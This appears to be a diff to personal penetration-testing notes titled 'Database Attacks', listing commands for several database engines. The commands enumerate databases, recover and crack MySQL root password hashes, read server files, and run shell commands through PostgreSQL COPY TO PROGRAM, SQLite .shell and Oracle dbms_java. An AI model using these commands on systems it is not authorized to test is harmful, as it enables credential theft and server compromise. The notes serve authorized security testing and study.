@@ -11,7 +11,8 @@ pagetitle: Database Attacks
 - `mysql -u {username} -p -h {host IP} -P {port}`
 - Specifying multiple parameters `SELECT user, passhash FROM mysql.user WHERE user = '{username}'`
 - Enumeration:
-	- List all databases: `SELECT * FROM information_schema.tables;`
+	- List all databases: `SELECT * FROM information_schema.tables;` (or `show databases;`)
+    	- Use a database with `use {db_name};` and enum tables with `show tables;`
 	- Version: `SELECT @@version;`
 	- Current user: `SELECT system_user();`
 - MySQL RCE via SQLi
@@ -22,6 +23,10 @@ pagetitle: Database Attacks
 	- Can also extract users/passwords and crack hashes
 	- Could search up phpmyadmin version to get RCE (LFI + session cookie can lead to RCE)
 - Dumping MySQL: `mysqldump -h [host] -u [user] -p[password] --all-databases > mysql_all_dbs.sql`
+- If we're able to log in as the `mysql` user, we can sometimes read the `/var/lib/mysql/mysql/user.MYD` file containing the root password hash
+  - The password will be split into two parts, one following `root*` and the other at the bottom of the file
+    - Putting these together will yield something like `root:*{combined_password}` which can be cracked with `john`
+  - Can do sometimes do something similar with `SELECT load_file('{file}');` as the root mysql user
 
 
 ## MSSQL
@@ -97,19 +102,28 @@ pagetitle: Database Attacks
 - Dumping MSSQL (table names): `Invoke-Sqlcmd -ServerInstance [server] -Username [user] -Password [password] -Query "SELECT name FROM master.sys.databases" | Format-Table -AutoSize > mssql_dbs.txt`
 
 ## SQLite
-- Use `sqlitebrowser` for viewing sqlite databases
+- Use `sqlitebrowser` for viewing sqlite databases visually 
+  - If we want to quickly view a db, we can just `sqlite3 {db_file}`
+- Enumeration:
+  - We can view version with `.version`, databases with `.databases`, tables with `.tables`
 - Can't execute functions, but can load malicious files
 	- `SELECT load_extension('/tmp/malicious.so');`
+	- Outdated versions may have RCE CVEs
 - `SQLite CLI` allows command execution with `.shell {command}` or `.system {command}`
-- Outdated versions may have RCE CVEs
+- We can read files with `.read {filename}`
 
 ## PostgreSQL
-- Use `psql` for to connect to PostgreSQL databases
+- Use `psql -U {username}` for to connect to PostgreSQL databases (with `-d {db_name}` for a database)
+  - Then, we can list databases with `\l` and use `\c {db_name}` to connect to the database
+  - `\d` to list the tables once connected
 - Command execution with `COPY (SELECT '') TO PROGRAM 'bash -c "whoami"';`
 	- Requires superuser
 - Command execution with `SELECT pg_execute_server_program('id');`
 	- This won't require superuser, but will require `pg_execute_server_program`
 - Dumping PostgreSQL: `pg_dump -h [host] -U [username] -F c -b -v -f postgresql_all.dump postgres`
+- Read files using `COPY`
+  - Start by creating a table with `CREATE TABLE demo(t text);`
+  - Then `COPY demo FROM '{filename}';`, and then we can just read from the demo table
 
 ## Oracle
 - Comand execution with `EXEC dbms_java.runjava('java.lang.Runtime.getRuntime().exec("{command}")');`
